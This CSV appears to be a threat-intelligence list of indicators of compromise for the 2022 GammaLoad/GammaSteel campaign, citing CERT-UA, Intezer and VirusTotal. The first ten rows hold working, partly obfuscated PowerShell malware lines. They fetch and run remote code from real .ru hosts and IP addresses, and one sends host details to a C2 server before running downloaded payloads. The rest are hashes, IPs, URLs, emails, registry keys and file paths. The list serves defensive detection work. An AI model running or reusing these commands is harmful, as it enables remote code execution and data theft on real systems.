Attack / Operation / Campaign,Year of attack,IoC Class,IoC Type,IoC Subtype,Indicator,Source of info
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};while ($IE1.ReadyState -ne 4) {Start-Sleep 2};$Doc = $IE1.document.GetType().InvokeMember('body'  [System.Reflection.BindingFlags]::GetProperty  $Null  $IE1.document  $Null).InnerHtml;$IE1.quit();[io.file]::WriteAllText($($env:USERPROFILE+'\index.txt') $Doc); iex(iex $Doc),https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.paparat.ru');$tmp = $(New-Object net.webclient).DownloadString('hXXp://'+$ip+'/lnk.php'); [io.file]::WriteAllText($($env:USERPROFILE+'\index.php') $tmp); iex(iex $tmp),https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hXXp://'+[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.lnasfe.ru')+'/lnk.php'); Set-Content -Path $env:USERPROFILE\index.php -Value $tmp; iex(iex $tmp),https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WiNDOwSTYle HIddEn -nOLoGO INvokE-exPRession (get-cOnTeNT $enV:usERPrOfilE\iNDeX.PHP | oUt-sTrInG) | PoWeRShELL -nOproFILE,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nol -nop echo (INVOKE-EXPRESSION(new-object net.webclient).downloadstring('hXXp://138.197.199.151/get.php')) | powershell -,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nol -nop echo ([system.text.encoding]::utf8.getstring((new-object net.webclient).UploadData('hXXp://159.203.11.73/get.php   POST'  0)))|iex,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nologo Invoke-Expression $env:Include,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,"function Random(){ $rnd='d' +-join ((48..57) + (97..122) | Get-Random -Count $( Get-Random -Minimum 10 -Maximum 25) | % {[char]$_}); return $rnd; } function XorByte($key, $response) { [byte[]]$new_bytes = new-object byte[] $response.Length; for($i=0; $i -lt $response.count ; $i++){ $new_bytes[$i] = $response[$i] -bxor $key[$i % $key.Length]; } ; return $new_bytes; } function Get-IP() {$wc= New-Object net.webclient; $wc.Headers.Add(""""Content-Type"""",""""application/x-www-form-urlencoded""""); $response = $wc.UploadData(""""hXXps://www.portcheckers.com/dns-lookup"""", [System.Text.Encoding]::UTF8.GetBytes(""""ipaddress=nxkad.ru"""")); $ip = [System.Text.Encoding]::UTF8.GetString($response) |?{$_ -match """"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}""""}|%{$Matches[0]}; return $ip; }while($count -le 4){ try{ $ip=Get-IP; $url = """"hXXp://"""" + $ip + """"/time.php""""; $key = (Get-WmiObject Win32_LogicalDisk -Filter """"DeviceID='$env:SystemDrive'"""" | Select-Object VolumeSerialNumber).VolumeSerialNumber; [string]$vsn = [System.Convert]::ToUInt32($key,16); $WebClient= New-Object net.webclient;$namevalueCln = New-Object System.Collections.Specialized.NameValueCollection; $rnd=Random; $namevalueCln.Add($rnd,$env:computername+"""";""""+$vsn); $response = $WebClient.UploadValues($url,$namevalueCln); [string]$myUri = [System.Text.Encoding]::UTF8.GetString($response); if($myUri.Length -gt 0){ if($myUri.substring(0,4) -eq """"hXXp"""" ){ $respa1 = $WebClient.UploadValues($myUri,$namevalueCln); $new_bytes = XorByte $vsn $respa1; [string]$path = $env:TEMP + '\' + $(Get-Random)+ '.exe'; [io.file]::WriteAllBytes($path ,$new_bytes); Start-Sleep -s 20; if($path.Length -gt 0){ [System.Diagnostics.Process]::Start([string]$path); } }else{ Start-Sleep -s 5; $new_bytes = XorByte $key $response; $myUri = [System.Text.Encoding]::UTF8.GetString($new_bytes); start-job { $sc = New-Object -ComObject MSScriptControl.ScriptControl.1; $sc.Timeout = 999999; $sc.Language = 'VBScript'; $sc.AddCode($args[0])} -ArgumentList $myUri -runas32 | wait-job | receive-job; } } }catch{} Start-Sleep -s 250; }",https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,powershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hXXp://motoristo.ru/get.php'))|powershell -),https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,powershell -w hidden -nol -nop -c (iex ([string]::join(''  ((101 99 104 111 32 40 105 101 120 32 40 110 101 119 45 111 98 106 101 99 116 32 110 101 116 46 119 101 98 99 108 105 101 110 116 41 46 100 111 119 110 108 111 97 100 115 116 114 105 110 103 40 39 104 116 116 112 58 47 47 109 111 116 111 114 105 115 116 111 46 114 117 47 103 101 116 46 112 104 112 39 41 41 124 112 111 119 101 114 115 104 101 108 108 32 45) |%{([char][int] $_)})))|iex),https://cert.gov.ua/article/1229152
,,General,MITRE Technique,,T1566.001,https://attack.mitre.org/techniques/T1566/001/
,,General,MITRE Technique,,T1199,https://attack.mitre.org/techniques/T1199/
,,General,MITRE Technique,,T1218.011,https://attack.mitre.org/techniques/T1218/011/
,,General,MITRE Technique,,T1106,https://attack.mitre.org/techniques/T1106/
,2022,Network,IP address,,45.61.136.16:80,https://analyze.intezer.com/url/85e10d45-e593-4286-8776-35a5c16218a2
,2022,Host,File,File hash SHA256,23d417cd0d3dc0517adb49b10ef11d53e173ae7b427dbb6a7ddf45180056c029,https://analyze.intezer.com/analyses/9dbd67c8-d038-4b61-98a4-7d35400dd20f
,2022,Host,File,File hash SHA256,acb3a5726a47f90c16938fe2d5fe31398d8c02e6310ef13fec0484b8eee43fee,https://analyze.intezer.com/analyses/e0d19e09-ed8f-485a-92bb-e7e997eddc42
,2022,Host,File,File hash SHA256,3df27b2dc57eb244aaa4556a6aa851dc3143108cf31ec9a6da0b70156d6c3e6c,https://analyze.intezer.com/analyses/8bae06ee-1b9a-45f7-8e3c-30c14a269ecf
,2022,Host,File,File hash SHA256,8c22533207ec41f971f8985b7566be3ce5d73d0f50a96817d7f038aca3326d20,https://analyze.intezer.com/analyses/53c7e83a-c983-43ce-8614-f9945b2e3246
,2022,Host,File,File hash SHA256,23f2bac355ae4537d01f857d1ef0985fccf7a0b1bdf455f7ba7f7de2aa885941,https://analyze.intezer.com/analyses/b0d80307-7d7a-48ec-a534-ea8417b88bbc
,2022,Host,File,File hash SHA256,d89bcc6fc915da12b1fd9b390ae06cc144f8eebe4619c957f0f3718c262816d7,https://analyze.intezer.com/analyses/20ccb01b-0baf-41b2-9e80-8239b52a2628
,2022,Host,File,File hash SHA256,6d77083d63adb5eea1009408c680869fd362227e411a15259ef93d7377f0505f,https://analyze.intezer.com/analyses/0e432714-d6af-46db-952b-e21d883ab755
,2022,Host,File,File hash SHA256,1fb2628812d5439df2e6f6bf1d19b42d1f7ab3f19f43721beee076c061f13c38,https://analyze.intezer.com/analyses/5ab3540d-ee00-4f47-ad0c-ac65dd6fff24
,2022,Host,File,File hash SHA256,2f688832035e8ea172c90c31114916f34f5d15943818d1096973c097ff0ee6ed,https://analyze.intezer.com/analyses/078acf98-4ce3-4725-a007-33f63af98da4
,2022,Host,File,File hash SHA256,b2122db8208f53273a09ecb1a7ff75e0303557d1b7df47ac2f7662f8c489675f,https://analyze.intezer.com/analyses/98959707-2e45-4bb4-9e2f-671b42e8ae87
,2022,Host,File,File hash SHA256,e27a5a63b4b5b54bcc92fd634af8ba080aafc52e24a6aa68911989e0339b0444,https://analyze.intezer.com/analyses/5a09467c-1264-4117-9e12-07d0033f8022
,2022,Host,File,File hash SHA256,f3917bcae3fde2397eac93d809281936652c632eee11f9f2083f79c97382300b,https://analyze.intezer.com/analyses/ecf7d562-60b9-47e6-af8f-8c0481719917
,2022,Host,File,File hash SHA256,aff520f254da3219f2a11df0120de065f664d07338a80015f22f40674eda31f7,https://analyze.intezer.com/analyses/c1561f5b-64a2-421d-8710-7d4406141210
,2022,Host,File,File hash SHA256,e6028b254a9784cf24139706a83a1f58607a4500eb64247a2ec7df50009a4cc3,https://analyze.intezer.com/analyses/fcbfba01-a28d-4ae4-8509-7a6fa89f25e3
,2022,Host,File,File hash SHA256,90cb5319d7b5bb899b1aa684172942f749755bb998de3a63b2bccb51449d1273,https://analyze.intezer.com/analyses/554fed21-5e9c-427e-99cb-c92346e95c1d
,2019,Host,File,File hash SHA256,20a7f517e02928b1dc03c0366a2947c29e14b264faf96a9e65e93d43f0b9004a,https://analyze.intezer.com/analyses/59cb7a75-cb2e-4cd7-b4ad-4f640372b5e2
,2022,Host,File,File hash SHA256,393475dc090afab9a9ddf04738787199813f3974a22c13cb26f43c781e7b632f,https://analyze.intezer.com/analyses/8774947a-883c-42cf-9c9b-0f141fc34bf5
,2022,Host,File,File hash SHA256,dd13b58b0d132dbf64573f90ea75f3ac030c0138ac940bfd593c6e54a33434cf,https://analyze.intezer.com/analyses/adcf0f68-e825-4e27-91e2-102fa73dc8d5
,2022,Host,File,File hash SHA256,56a2171a8633cbb03362a37f0c5f0b5cf7695f19d14eaf0b6d273145edaac29e,https://analyze.intezer.com/analyses/9f1d5a16-629a-4fa8-a474-d7f6c1781390
,2022,Host,File,File hash SHA256,2e9bef653e6a92b5570f2736bec5ecf64ef0f4342fba6f21a3c1c0f97f33346d,https://analyze.intezer.com/analyses/aa1134ba-2bcb-4b14-87ed-e46259577085
,2022,Host,File,File hash SHA256,ce46746ed0d17925e07dfec70b3df69d181f55d52eb884aa96c431f5f980ca0c,https://analyze.intezer.com/analyses/725fc9b9-ada5-4c16-bc0b-5e7fb3acaa58
,2022,Network,Email,,military-prosecutor@post.cz,https://cert.gov.ua/article/39386
,2022,Network,Email,,Info@military-ukraine.site,https://cert.gov.ua/article/39086
,2022,Network,URL,,http://atlanticos.site/south.php,https://www.virustotal.com/gui/url/7bb46effe36c798b226b476384cb333936a859ecfb4ea0273c84c260f1bc3916?nocache=1
,2022,Host,Registry,Registry Key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\S-1-5-21-3170026379-3177503207-93694414-1001S-1-5-21-3170026379-3177503207-93694414-1001\Index,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Network,IP address,,185.137.235.192,https://analyze.intezer.com/url/3c04ebae-734c-4c65-94ae-d7a1b8e0e11d
,2022,Network,URL,,http://wxanalytics.ru/net.exe,https://www.virustotal.com/gui/url/c0c2149c535e87f731ee0a54bc98b2489541fb81c9113d7e9174335cb7070c25
,2022,Network,Domain,,mortalin.ru,https://www.virustotal.com/gui/domain/mortalin.ru
,2022,Network,IP address,,89.108.70.47,https://analyze.intezer.com/url/3404ce6d-9ee5-47e8-9c11-415b60984aa5
,2022,Host,File,File hash SHA256,9e8c79822a4012e7d5fc9c3fe80196d6bbe3be23449069995319c818235eebc5,https://analyze.intezer.com/analyses/dd647343-722a-40c7-a1d6-cbf01e2fec74
,2022,Host,File,File hash SHA256,92667723d5956259d562e1defb44cb086c13f765087622142196b57320837117,https://analyze.intezer.com/analyses/4a09d62c-ce46-45c6-8382-42b14744d62a
,2022,Host,File,File hash SHA256,a2966cd84a931e6d5bac273e685fa35c637502d023abe45f8573fcb922a7fc5e,https://analyze.intezer.com/analyses/076c4ed4-eda2-4836-a902-6cbb9af7bbdf
,2022,Host,File,File hash SHA256,aa00b8713ca0340c6526ea60ca3e6538126c61267ed5f6b4777a73fb5c1f4f16,https://analyze.intezer.com/analyses/aeeed579-623e-48f5-8c99-4c964d25a699
,2022,Host,File,File hash SHA256,ab67653691be37c79d8189ae208eb1b37d560614ee4b46d08bd0e254b6eb5cc7,https://analyze.intezer.com/analyses/dd9b285e-ccb1-475f-a968-2e1ef4df788e
,2022,Host,Registry,Registry Key,HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency\DocumentRecovery\5F9E2D\5F9E2D,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,Registry,Registry Key,"HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency\StartupItems\b""|",https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,Registry,Registry Key,HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency\StartupItems\du},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-{7FA37C13-3C6D-414D-8FA8-6CEBFD292ED4}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detectt
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{A8220EFB-A945-4D33-91A4-688CBBCB2C38},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{F49DCDC7-E1F3-437B-93E9-1B3CE703E4AA},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~DF9FBD36895B8F94A8.TMP,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,File hash SHA256,bb58d2e94c3b6de1311018bedca8ae8751470d398d39ed0420b5c6bff436e4cb,https://analyze.intezer.com/analyses/72620ea1-a8a8-4a8a-887b-2333e204d3aa
,2022,Host,File,File hash SHA256,be7d70fb705c74f2de86db2b34f3e7587e5b3ded2d02eaad48fcfee426379372,https://analyze.intezer.com/analyses/b272909d-ad65-4795-b62e-e2dabba22ff9
,2022,Host,File,File hash SHA256,2d99e762a41abec05e97dd1260775bad361dfa4e8b4120b912ce9c236331dd3f,https://analyze.intezer.com/analyses/972898e2-5e6b-4635-8962-7687116020c9
,2022,Host,File,File hash SHA256,295654e3284158bdb94b40d7fb98ede8f3eab72171e027360a654f9523ece566,https://analyze.intezer.com/analyses/7f0957e9-7dc3-4b25-b146-0e3b281828ba
,2022,Host,File,File hash SHA256,2f35cce3c4ece454ac24a6764d00239b88baaf0db4056de24c9bb4c4bf27f8a9,https://analyze.intezer.com/analyses/a07a37cd-69c4-4a92-9d71-7cdba949e247
,2022,Host,File,File hash SHA256,3bdc2d69d7e1625913cf7a9802396b693004ad84a43ee9e57230d22679b46839,https://analyze.intezer.com/analyses/9f5cf492-40f7-4304-8049-902fb13a5e14
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{3D98095C-AABD-4F97-987C-334985D13D37}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detectt
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{B39F007B-CAA3-40DF-B3DC-2D79834C6CAD}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~DF7E738A5C207CEB97.TMP,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\FSD-{68F30A9F-FC40-4F49-AF55-26FA6A63F22B}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
